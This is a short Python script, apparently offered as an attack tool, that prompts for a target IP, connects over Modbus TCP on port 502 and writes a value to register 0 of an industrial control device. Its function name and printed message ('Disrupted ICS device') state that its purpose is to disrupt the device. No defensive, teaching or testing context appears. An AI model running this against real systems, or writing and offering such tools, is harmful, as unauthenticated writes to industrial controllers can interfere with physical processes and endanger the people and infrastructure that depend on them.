from pymodbus.client.sync import ModbusTcpClient as ModbusClient
import sys

def disrupt_ics(target):
    client = ModbusClient(target, port=502)
    try:
        client.connect()
        client.write_register(0, 1)
        print(f"Disrupted ICS device at {target}")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.close()

def main():
    target = input("Enter target IP: ")
    disrupt_ics(target)

if __name__ == "__main__":
    main()
